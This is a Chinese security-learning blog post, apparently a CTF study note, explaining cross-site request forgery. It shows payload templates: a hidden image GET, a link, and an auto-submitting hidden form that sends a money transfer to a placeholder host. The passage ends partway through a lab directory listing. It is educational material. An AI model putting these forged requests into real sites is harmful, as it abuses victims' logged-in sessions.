@@ -1,0 +1,1250 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CSRF, wuk0Ng">
+    <meta name="description" content="wuk0Ng的个人博客">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>CSRF | wuk0Ng</title>
+    <link rel="icon" type="image/jpeg" href="/shaoqing.jpg">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+   <style>
+    body{
+       background-image: url(/medias/my_background.jpg);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/jiushen.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">wuk0Ng</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/jiushen.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">wuk0Ng</div>
+        <div class="logo-desc">
+            
+            wuk0Ng的个人博客
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/web-wuk0Ng" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/web-wuk0Ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CSRF</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                                <span class="chip bg-color">比赛</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                记录
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-09-26
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="什么是csrf"><a href="#什么是csrf" class="headerlink" title="什么是csrf"></a>什么是csrf</h1><p>攻击者利用用户已经认证过的会话来执行未经用户授权的操作。攻击者会诱使用户在受信任的网站上执行恶意操作，从而利用用户的身份来发送恶意请求。这种攻击通过在受害者浏览器中注入恶意代码或链接来实施<br>csrf攻击的目标是利用用户在目标网站上已经建立的会话，来执行一些可能危害用户的操作，比如更改用户密码、发送恶意邮件等<br>简单来说，就是攻击者利用已登陆受信任网站的用户在不知情的情况下，向该站点发送恶意请求，利用的是浏览器会自动带上该站点的认证凭证（cookie）<br>前提：会一些基础的h5、c3以及js</p>
+<h1 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h1><h2 id="通过图片的img-src属性，自动加载，发起get请求"><a href="#通过图片的img-src属性，自动加载，发起get请求" class="headerlink" title="通过图片的img src属性，自动加载，发起get请求"></a>通过图片的img src属性，自动加载，发起get请求</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img</span><br><span class="line">src=</span><br><span class="line">&quot;http://xxxxxx?nameid=xxx&amp;amount=xxx&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="构建一个超链接，用户点击以后，发起get请求"><a href="#构建一个超链接，用户点击以后，发起get请求" class="headerlink" title="构建一个超链接，用户点击以后，发起get请求"></a>构建一个超链接，用户点击以后，发起get请求</h2><p>使用a标签的href属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a</span><br><span class="line">href=</span><br><span class="line">&quot;http://xxxxxx?amount=1000&amp;to=jiangang&quot; taget=&quot;_blank&quot;&gt;xxx&lt;a/&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="通过提交隐藏的表单，用户点击，自动提交，发起POST"><a href="#通过提交隐藏的表单，用户点击，自动提交，发起POST" class="headerlink" title="通过提交隐藏的表单，用户点击，自动提交，发起POST"></a>通过提交隐藏的表单，用户点击，自动提交，发起POST</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=</span><br><span class="line">&quot;http://xxxxxx&quot; method=POST&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;account&quot; value=&quot;xiaoming&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;1000&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;to&quot; value=&quot;jiangang&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="判断一个网站是否具有csrf漏洞"><a href="#判断一个网站是否具有csrf漏洞" class="headerlink" title="判断一个网站是否具有csrf漏洞"></a>判断一个网站是否具有csrf漏洞</h1><p>1.是否可以从第三方接口直接调用<br>2.如何对接口进行检测：抓取正常通信的包，再次请求<br>3.自动化检测工具，bp模块，csrfTester，<a target="_blank" rel="noopener" href="https://github.com/s0md3v/Bolt">https://github.com/s0md3v/Bolt</a><br>等</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>这里我们选择安装这个pikachu的靶机，然后就可以正常访问了<br>安装的过程中，还是遇到了一些不是很多的事情，然后又积累了一些经验，可以当作一些小插曲</p>
+<h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>主要就是你要在小皮面板里面打开服务，之前我是用过这个来搭建一个sql的靶机，很久之前的事情了，所以也对这些有些生疏了<br>这里我们可以注意一下一些稍微不一样的点<br>一个是phpstudy里面的结构，大概是在你的phpstudy下，也就是你最初下载文件的地方，一般都是将靶机什么的放入WWW目录下，然后有一个localhost，就是把靶机放在这些文件的下面<br>后面的话目录大概如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><span class="line">D:.</span><br><span class="line">├─error</span><br><span class="line">├─phpMyAdmin4.8.5</span><br><span class="line">│  ├─doc</span><br><span class="line">│  │  └─html</span><br><span class="line">│  │      ├─_images</span><br><span class="line">│  │      ├─_sources</span><br><span class="line">│  │      └─_static</span><br><span class="line">│  ├─error</span><br><span class="line">│  ├─examples</span><br><span class="line">│  ├─js</span><br><span class="line"></span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─fr</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─gl</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─he</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─hu</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─hy</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─ia</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─id</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─it</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─ja</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─ko</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─lt</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─nb</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─nl</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─pl</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─pt</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─pt_BR</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─ro</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─ru</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─si</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─sk</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─sl</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─sq</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─sr@latin</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─sv</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─tr</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─uk</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─vi</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  ├─zh_CN</span><br><span class="line">│  │  │  └─LC_MESSAGES</span><br><span class="line">│  │  └─zh_TW</span><br><span class="line">│  │      └─LC_MESSAGES</span><br><span class="line">│  ├─setup</span><br><span class="line">│  │  ├─frames</span><br><span class="line">│  │  └─lib</span><br><span class="line">│  ├─sql</span><br><span class="line">│  ├─templates</span><br><span class="line">│  │  ├─columns_definitions</span><br><span class="line">│  │  ├─components</span><br><span class="line">│  │  ├─config</span><br><span class="line">│  │  │  └─form_display</span><br><span class="line">│  │  ├─console</span><br><span class="line">│  │  ├─database</span><br><span class="line">│  │  │  ├─central_columns</span><br><span class="line">│  │  │  ├─designer</span><br><span class="line">│  │  │  ├─multi_table_query</span><br><span class="line">│  │  │  ├─qbe</span><br><span class="line">│  │  │  ├─search</span><br><span class="line">│  │  │  ├─structure</span><br><span class="line">│  │  │  └─tracking</span><br><span class="line">│  │  ├─display</span><br><span class="line">│  │  │  ├─export</span><br><span class="line">│  │  │  ├─import</span><br><span class="line">│  │  │  └─results</span><br><span class="line">│  │  ├─encoding</span><br><span class="line">│  │  ├─error</span><br><span class="line">│  │  ├─export</span><br><span class="line">│  │  ├─javascript</span><br><span class="line">│  │  ├─list</span><br><span class="line">│  │  ├─login</span><br><span class="line">│  │  │  └─twofactor</span><br><span class="line">│  │  ├─navigation</span><br><span class="line">│  │  ├─privileges</span><br><span class="line">│  │  ├─server</span><br><span class="line">│  │  │  ├─binlog</span><br><span class="line">│  │  │  ├─collations</span><br><span class="line">│  │  │  ├─databases</span><br><span class="line">│  │  │  ├─engines</span><br><span class="line">│  │  │  ├─plugins</span><br><span class="line">│  │  │  └─variables</span><br><span class="line">│  │  ├─table</span><br><span class="line">│  │  │  ├─browse_foreigners</span><br><span class="line">│  │  │  ├─chart</span><br><span class="line">│  │  │  ├─gis_visualization</span><br><span class="line">│  │  │  ├─insert</span><br><span class="line">│  │  │  ├─relation</span><br><span class="line">│  │  │  ├─search</span><br><span class="line">│  │  │  ├─structure</span><br><span class="line">│  │  │  └─tracking</span><br><span class="line">│  │  └─test</span><br><span class="line">│  │      └─gettext</span><br><span class="line">│  ├─themes</span><br><span class="line">│  │  ├─original</span><br><span class="line">│  │  │  ├─css</span><br><span class="line">│  │  │  ├─img</span><br><span class="line">│  │  │  └─jquery</span><br><span class="line">│  │  │      └─images</span><br><span class="line">│  │  └─pmahomme</span><br><span class="line">│  │      ├─css</span><br><span class="line">│  │      ├─img</span><br><span class="line">│  │      │  └─designer</span><br><span class="line">│  │      └─jquery</span><br><span class="line">│  │          └─images</span><br><span class="line">│  ├─tmp</span><br><span class="line">│  │  └─twig</span><br><span class="line">│  │      ├─00</span><br><span class="line"></span><br><span class="line">│  └─vendor</span><br><span class="line">│      ├─bacon</span><br><span class="line">│      │  └─bacon-qr-code</span><br><span class="line">│      │      ├─src</span><br><span class="line">│      │      │  └─BaconQrCode</span><br><span class="line">│      │      │      ├─Common</span><br><span class="line">│      │      │      ├─Encoder</span><br><span class="line">│      │      │      ├─Exception</span><br><span class="line">│      │      │      └─Renderer</span><br><span class="line">│      │      │          ├─Color</span><br><span class="line">│      │      │          ├─Image</span><br><span class="line">│      │      │          │  └─Decorator</span><br><span class="line">│      │      │          └─Text</span><br><span class="line">│      │      └─tests</span><br><span class="line">│      │          └─BaconQrCode</span><br><span class="line">│      │              ├─Common</span><br><span class="line">│      │              ├─Encoder</span><br><span class="line">│      │              └─Renderer</span><br><span class="line">│      │                  └─Text</span><br><span class="line">│      ├─bin</span><br><span class="line">│      ├─composer</span><br><span class="line">│      ├─google</span><br><span class="line">│      │  └─recaptcha</span><br><span class="line">│      │      ├─.github</span><br><span class="line">│      │      │  └─ISSUE_TEMPLATE</span><br><span class="line">│      │      └─src</span><br><span class="line">│      │          └─ReCaptcha</span><br><span class="line">│      │              └─RequestMethod</span><br><span class="line">│      ├─paragonie</span><br><span class="line">│      │  ├─constant_time_encoding</span><br><span class="line">│      │  │  ├─src</span><br><span class="line">│      │  │  └─tests</span><br><span class="line">│      │  └─random_compat</span><br><span class="line">│      │      ├─dist</span><br><span class="line">│      │      └─lib</span><br><span class="line">│      ├─phpmyadmin</span><br><span class="line">│      │  ├─motranslator</span><br><span class="line">│      │  │  ├─.github</span><br><span class="line">│</span><br><span class="line">├─phpstudy</span><br><span class="line">│  └─.idea</span><br><span class="line">├─pikachu</span><br><span class="line">│  └─pikachu-master</span><br><span class="line">│      ├─assets</span><br><span class="line">│      │  ├─css</span><br><span class="line">│      │  ├─font-awesome</span><br><span class="line">│      │  │  └─4.5.0</span><br><span class="line">│      │  │      ├─css</span><br><span class="line">│      │  │      └─fonts</span><br><span class="line">│      │  ├─fonts</span><br><span class="line">│      │  ├─images</span><br><span class="line">│      │  │  ├─avatars</span><br><span class="line">│      │  │  ├─bootstrap-colorpicker</span><br><span class="line">│      │  │  ├─email</span><br><span class="line">│      │  │  ├─gallery</span><br><span class="line">│      │  │  ├─nbaplayer</span><br><span class="line">│      │  │  └─placeholder</span><br><span class="line">│      │  ├─js</span><br><span class="line">│      │  └─swf</span><br><span class="line">│      ├─inc</span><br><span class="line">│      ├─pkxss</span><br><span class="line">│      │  ├─inc</span><br><span class="line">│      │  ├─rkeypress</span><br><span class="line">│      │  ├─xcookie</span><br><span class="line">│      │  └─xfish</span><br><span class="line">│      ├─test</span><br><span class="line">│      ├─vul</span><br><span class="line">│      │  ├─burteforce</span><br><span class="line">│      │  ├─csrf</span><br><span class="line">│      │  │  ├─csrfget</span><br><span class="line">│      │  │  ├─csrfpost</span><br><span class="line">│      │  │  └─csrftoken</span><br><span class="line">│      │  ├─dir</span><br><span class="line">│      │  │  └─soup</span><br><span class="line">│      │  ├─fileinclude</span><br><span class="line">│      │  │  └─include</span><br><span class="line">│      │  ├─infoleak</span><br><span class="line">│      │  ├─overpermission</span><br><span class="line">│      │  │  